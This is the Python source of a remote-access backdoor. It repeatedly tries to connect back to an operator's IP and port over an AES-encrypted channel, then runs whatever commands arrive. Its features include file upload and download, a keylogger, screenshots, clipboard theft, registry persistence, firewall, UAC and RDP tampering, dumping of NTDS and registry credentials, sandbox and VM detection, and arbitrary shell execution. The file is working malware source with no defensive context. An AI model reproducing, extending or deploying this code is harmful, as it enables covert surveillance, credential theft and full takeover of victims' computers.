#!/usr/bin/python

import lib.keylogger
from lib.AES_cipher import AESCipher
from lib.chdir import chdir
from lib.check_sandbox import detectSandboxie
from lib.check_vm import detectVM
from lib.clip_dump import clipboard
from lib.firewall import firewall
from lib.persist_registry import persist_reg
from lib.screenshot import screenshot
from lib.spawn import spawn
from lib.sysinfo import sysinfo
from lib.win_creds import *
from lib.RDP import *
from lib.UAC import *
from lib.display import *
from lib.env import get_env

global connected, sock

# main backdoor class and functions #################################################################
class Backdoor:
    def __init__(self, ip, port):

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = False
        while True:
            if not self.connected:
                try:
                    self.sock.connect((ip, port))
                    self.connected = True
                    break
                except socket.error:
                    continue

    # encrypt/decrypt data ###############################################################
    def encrypt(self, message):
        encrypted = AESCipher(password).encrypt(message)
        return encrypted

    def decrypt(self, message):
        decrypted = AESCipher(password).decrypt(message)
        return decrypted

    # send/receive data ########################################################
    def json_send(self, data):
        try:
            json_data = json.dumps(data)
            return self.sock.send(self.encrypt(json_data))
        except Exception,e:
            return e
            pass

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.sock.recv(1000000)
                return json.loads(self.decrypt(json_data))
            except ValueError:
                continue
            except:
                pass

    # read/write file ##################################
    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "\033[1;32;32m[+]\x1b[0m upload completed \033[1;32;32m[+]\x1b[0m"
        except:
            return "\033[1;32;31m[-]\x1b[0m failed to write file \033[1;32;31m[-]\x1b[0m"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            return "\033[1;32;31m[-]\x1b[0m no such file or directory \033[1;32;31m[-]\x1b[0m"



    # run commands #############################################################################################
    def run(self):

        global t1
        t1 = threading.Thread(target=lib.keylogger.start)
        while True:

            result = ""
            cmd = self.receive()

            if "terminate" in cmd:
                sys.exit(0)
            elif cmd[0] == "download":
                result = self.read_file(cmd[1])
            elif cmd[0] == "upload":
                result = self.write_file(cmd[1], cmd[2])
            elif cmd[0] == "shot":
                screenshot()
                result = self.read_file('monitor-1.png')
                os.remove('monitor-1.png')
            elif cmd[0] == "sysinfo":
                result = sysinfo()
            elif cmd[0] == "getenv":
                result = get_env()
            elif cmd[0] == "checkvm":
                result = str(detectSandboxie()) + "\n" + str(detectVM())
            elif cmd[0] == "persist_reg":
                result = persist_reg()
            elif cmd[0] == "rdp":
                result = rdp(cmd[1])
            elif cmd[0] == "uac":
                result = uac(cmd[1])
            elif cmd[0] == "display":
                result = display(cmd[1])
            elif cmd[0] == "clip":
                result = clipboard()
            elif cmd[0] == 'fw' and len(cmd) == 4:
                result = firewall(cmd[1], cmd[2], cmd[3])
            elif cmd[0] == "dump_ntds":
                result = ntds()
            elif cmd[0] == "key_start":
                if t1.is_alive():
                    result = "\033[1;32;32m[+]\x1b[0m key logger is already running \033[1;32;32m[+]\x1b[0m"
                else:
                    try:
                        os.remove(lib.keylogger.keylogger_path)
                    except:
                        pass
                    try:
                        t1.start()
                        result = "\033[1;32;32m[+]\x1b[0m key logger started \033[1;32;32m[+]\x1b[0m"
                    except Exception, e:
                        result = "\033[1;32;31m[-]\x1b[0m failed to start keylogger \033[1;32;31m[-]\x1b[0m\n" + str(e)
                        pass
            elif cmd[0] == "key_dump":
                try:
                    if os_type == "windows":
                        DEVNULL = open(os.devnull, 'wb')
                        result = subprocess.check_output("type " + lib.keylogger.keylogger_path, shell=True,
                                                         stderr=DEVNULL, stdin=DEVNULL)
                    else:
                        result = subprocess.check_output("cat " + lib.keylogger.keylogger_path, shell=True,
                                                         stderr=subprocess.STDOUT)

                except Exception, e:
                    result = "\033[1;32;31m[-]\x1b[0m failed to dump key logs \033[1;32;31m[-]\x1b[0m\n" + str(e)
                    pass
            elif cmd[0] == "key_stop":
                if t1.is_alive():
                    t1.join(0.1)
                    try:
                        os.remove(lib.keylogger.keylogger_path)
                    except:
                        pass
                    result = "\033[1;32;32m[+]\x1b[0m key logger stopped \033[1;32;32m[+]\x1b[0m"
                else:
                    result = "\033[1;32;32m[+]\x1b[0m key logger is not running \033[1;32;32m[+]\x1b[0m"

            elif cmd[0] == "dump_regsave":
                result = reg_save()
            elif cmd[0] == "spawn":
                result = spawn(cmd[1], cmd[2])
            elif cmd[0] == "cd" and len(cmd) > 1:
                directory = ' '.join(cmd[1:])
                result = chdir(directory)
            elif len(cmd) > 0:
                try:
                    cmd = ' '.join(cmd[0:])
                    if os_type == "linux":
                        result = str(subprocess.check_output(cmd + "; exit 0", shell=True, stderr=subprocess.STDOUT))
                    else:
                        DEVNULL = open(os.devnull, 'wb')
                        result = str(subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL))
                except:
                    result = " "
                    pass
            self.json_send(result)


def runner():
    if __name__ == '__main__':
        starter = Backdoor(ip, port)
        starter.run()


runner()
